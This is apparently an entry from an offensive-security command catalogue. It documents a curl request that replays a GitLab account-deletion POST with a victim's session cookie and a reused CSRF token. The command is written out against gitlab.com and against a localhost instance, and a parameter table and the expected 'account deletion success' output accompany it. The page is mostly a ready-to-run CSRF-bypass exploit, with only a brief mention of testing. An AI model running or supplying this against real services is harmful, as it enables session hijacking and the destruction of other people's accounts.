---
data: >-
  curl -X POST https://gitlab.com/users -H "Cookie:
  _gitlab_session=568a0c6e266c55938182945af357dda4;" -H "Content-Type:
  application/x-www-form-urlencoded" -d
  "_method=delete&authenticity_token=a57BV%2BO0KhEtRe%2FS9W2%2FIBqZj2bWA8jbfE38VlA4pzN1wBKov8F4UV7gYerBaLOumjqpnIoC2Dsx1jufaAZGsg%3D%3D"
tags:
  - csrf
  - http-post
  - token-bypass
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:27:29.411Z'
id: eb9c4171-aac0-43c7-af4c-5b8c3562f6c0
verified: false
validated: true
submitted: true
---
# curl-modified-deletion-request

## Command

```bash
curl -X POST https://gitlab.com/users -H "Cookie: _gitlab_session=568a0c6e266c55938182945af357dda4;" -H "Content-Type: application/x-www-form-urlencoded" -d "_method=delete&authenticity_token=a57BV%2BO0KhEtRe%2FS9W2%2FIBqZj2bWA8jbfE38VlA4pzN1wBKov8F4UV7gYerBaLOumjqpnIoC2Dsx1jufaAZGsg%3D%3D"
```

## Description

This curl command represents a modified GitLab deletion request with a new session cookie but reused CSRF token, for testing the bypass in a local or remote instance.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP POST method | Yes |
| `-H "Cookie: ..."` | Victim's session cookie | Yes |
| `-H "Content-Type: ..."` | Form data type | Yes |
| `-d "..."` | Delete payload with reused token | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://gitlab.com/users -H "Cookie: _gitlab_session=568a0c6e266c55938182945af357dda4;" -H "Content-Type: application/x-www-form-urlencoded" -d "_method=delete&authenticity_token=a57BV%2BO0KhEtRe%2FS9W2%2FIBqZj2bWA8jbfE38VlA4pzN1wBKov8F4UV7gYerBaLOumjqpnIoC2Dsx1jufaAZGsg%3D%3D"
```

### Advanced Usage

Include full headers from reproduction:

```bash
curl -X POST https://localhost:3000/users -H "User-Agent: Mozilla/5.0 ..." -H "Cookie: _gitlab_session=568a0c6e266c55938182945af357dda4;" -H "Content-Type: application/x-www-form-urlencoded" -d "_method=delete&authenticity_token=a57BV%2BO0KhEtRe%2FS9W2%2FIBqZj2bWA8jbfE38VlA4pzN1wBKov8F4UV7gYerBaLOumjqpnIoC2Dsx1jufaAZGsg%3D%3D"
```

## Expected Output

Account deletion success or ActionController::InvalidAuthenticityToken in patched versions; success in vulnerable setups.

## Related

- [[commands/curl-capture-deletion-request]]
- [[procedures/Modify-Captured-Request-with-New-Session-Cookie]]
